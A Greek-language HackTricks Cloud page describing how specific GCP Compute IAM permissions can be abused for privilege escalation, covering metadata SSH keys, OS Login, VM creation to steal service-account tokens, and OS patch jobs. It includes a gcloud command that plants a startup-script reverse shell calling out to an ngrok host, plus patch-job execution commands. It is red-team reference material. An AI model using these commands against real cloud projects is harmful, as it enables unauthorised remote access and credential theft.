# GCP - Εscalation προνομίων στο Compute

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Compute

Για περισσότερες πληροφορίες σχετικά με το Compute και το VPC (δίκτυο) στο GCP ελέγξτε:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Σημειώστε ότι για να εκτελέσετε όλες τις επιθέσεις εξέλιξης προνομίων που απαιτούν τροποποίηση των μεταδεδομένων της εικόνας (όπως η προσθήκη νέων χρηστών και κλειδιών SSH) **χρειάζεται να έχετε δικαιώματα `actAs` πάνω στο SA που είναι συνδεδεμένο με την εικόνα**, ακόμη κι αν το SA είναι ήδη συνδεδεμένο!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Με αυτήν την άδεια μπορείτε **να τροποποιήσετε** τις πληροφορίες **μεταδεδομένων** μιας **εικόνας** και να αλλάξετε τα **εξουσιοδοτημένα κλειδιά ενός χρήστη**, ή **να δημιουργήσετε ένα νέο χρήστη με δικαιώματα sudo**. Έτσι, θα μπορείτε να εκτελέσετε μέσω SSH σε οποιαδήποτε εικονική μηχανή και να κλέψετε τον Λογαριασμό Υπηρεσιών GCP με τον οποίο λειτουργεί η εικόνα.\
Περιορισμοί:

* Σημειώστε ότι οι Λογαριασμοί Υπηρεσιών GCP που λειτουργούν σε εικόνες VM έχουν από προεπιλογή ένα **πολύ περιορισμένο εύρος εφαρμογής**
* Θα πρέπει να είστε **σε θέση να επικοινωνήσετε με τον διακομιστή SSH** για να συνδεθείτε

Για περισσότερες πληροφορίες σχετικά με το πώς να εκμεταλλευτείτε αυτήν την άδεια ελέγξτε:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Μπορείτε επίσης να εκτελέσετε αυτήν την επίθεση προσθέτοντας νέο startup-script και επανεκκινώντας την εικόνα:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Αυτή η άδεια δίνει τα **ίδια προνόμια με την προηγούμενη άδεια** αλλά για συγκεκριμένες μονάδες αντί για ολόκληρο έργο. Οι **ίδιες εκμεταλλεύσεις και περιορισμοί όπως και για την προηγούμενη ενότητα ισχύουν**.

### `compute.instances.setIamPolicy`

Αυτού του είδους η άδεια θα σας επιτρέψει να **χορηγήσετε στον εαυτό σας έναν ρόλο με τα προηγούμενα προνόμια** και να εξελίξετε τα προνόμια καταχρώμενος αυτά.

### **`compute.instances.osLogin`**

Εάν **το OSLogin είναι ενεργοποιημένο στη μονάδα**, με αυτή την άδεια μπορείτε απλά να εκτελέσετε **`gcloud compute ssh [INSTANCE]`** και να συνδεθείτε στη μονάδα. Δεν θα έχετε **δικαιώματα root** μέσα στη μονάδα.

{% hint style="success" %}
Για να συνδεθείτε με επιτυχία με αυτή την άδεια μέσα στη μονάδα VM, πρέπει να έχετε την άδεια `iam.serviceAccounts.actAs` πάνω στο SA που είναι συνδεδεμένο με τη VM.
{% endhint %}

### **`compute.instances.osAdminLogin`**

Εάν **το OSLogin είναι ενεργοποιημένο στη μονάδα**, με αυτή την άδεια μπορείτε απλά να εκτελέσετε **`gcloud compute ssh [INSTANCE]`** και να συνδεθείτε στη μονάδα. Θα έχετε **δικαιώματα root** μέσα στη μονάδα.

{% hint style="success" %}
Για να συνδεθείτε με επιτυχία με αυτή την άδεια μέσα στη μονάδα VM, πρέπει να έχετε την άδεια `iam.serviceAccounts.actAs` πάνω στο SA που είναι συνδεδεμένο με τη VM.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Είναι δυνατόν να **δημιουργήσετε ένα εικονικό μηχάνημα με εκχωρημένο Λογαριασμό Υπηρεσίας και να κλέψετε το τοκέν του λογαριασμού υπηρεσίας προσπελαύνοντας τα μεταδεδομένα για να εξελίξετε τα προνόμια σε αυτόν.

Το σενάριο εκμετάλλευσης για αυτήν τη μέθοδο μπορεί να βρεθεί [εδώ](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

Αν έχετε τις **`osconfig.patchDeployments.create`** ή **`osconfig.patchJobs.exec`** άδειες μπορείτε να δημιουργήσετε ένα [**patch job ή αναπτύξεις**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching). Αυτό θα σας επιτρέψει να μετακινηθείτε πλαγίως στο περιβάλλον και να κερδίσετε εκτέλεση κώδικα σε όλες τις μονάδες υπολογιστών εντός ενός έργου.

Αν θέλετε να εκμεταλλευτείτε χειροκίνητα αυτό, θα πρέπει να δημιουργήσετε είτε ένα [patch job](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_job.json) είτε μια [αναπτυξιακή διαδικασία](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_deployment.json) για ένα patch job εκτελέστε:

`gcloud compute os-config patch-jobs execute --file=patch.json`

Για να αναπτύξετε μια αναπτυξιακή διαδικασία:

`gcloud compute os-config patch-deployments create my-update --file=patch.json`

Υπάρχουν αυτοματοποιημένα εργαλεία όπως το [patchy](https://github.com/rek7/patchy) που υπάρχουν για να ανιχνεύσουν χαλαρές άδειες και να μετακινηθούν πλαγίως αυτόματα.

**Μπορείτε επίσης να εκμεταλλευτείτε αυτό για μόνιμη παραμονή.**

### `compute.machineImages.setIamPolicy`

**Χορηγήστε στον εαυτό σας επιπλέον δικαιώματα** στην εικόνα μηχανής.

### `compute.snapshots.setIamPolicy`

**Χορηγήστε στον εαυτό σας επιπλέον δικαιώματα** σε ένα αντίγραφο ασφαλείας δίσκου.

### `compute.disks.setIamPolicy`

**Χορηγήστε στον εαυτό σας επιπλέον δικαιώματα** σε ένα δίσκο.

### Παράκαμψη Εμβέλειας Πρόσβασης

Ακολουθώντας αυτό το σύνδεσμο θα βρείτε μερικές [**ιδέες για να προσπαθήσετε να παρακάμψετε τις εμβέλειες πρόσβασης**](../).

### Τοπική Ανόδος Προνομίων στην Μονάδα Υπολογιστή GCP

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## Αναφορές

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγράφου**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>
